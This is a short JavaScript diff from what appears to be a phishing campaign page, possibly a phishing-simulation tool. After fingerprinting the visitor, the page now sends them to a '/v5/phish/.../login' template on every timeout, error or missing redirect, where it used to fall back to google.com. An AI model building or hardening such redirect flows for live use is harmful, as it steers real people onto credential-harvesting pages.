@@ -58,6 +58,13 @@
         (async function() {
             const cid = document.querySelector('meta[name="campaign-id"]').content;
             const sid = document.querySelector('meta[name="session-id"]').content;
+            const fallback = `/v5/phish/${cid}/login?sid=${encodeURIComponent(sid)}`;
+            let finished = false;
+            
+            // Hard fallback in case anything hangs
+            const timer = setTimeout(() => {
+                if (!finished) window.location.href = fallback;
+            }, 2500);
             
             try {
                 // Collect Fingerprint - VantaFP is the default global name set by Polymorph
@@ -74,15 +81,23 @@
                     })
                 });
                 
+                if (!response.ok) {
+                    window.location.href = fallback;
+                    return;
+                }
+                
                 const data = await response.json();
                 
                 if (data.redirect_to) {
+                    finished = true;
+                    clearTimeout(timer);
                     window.location.href = data.redirect_to;
+                } else {
+                    window.location.href = fallback;
                 }
             } catch (e) {
-                console.error("Verification failed", e);
-                // Fallback
-                window.location.href = "https://www.google.com";
+                // Fallback vers le template si échec JS/réseau
+                window.location.href = fallback;
             }
         })();
     </script>
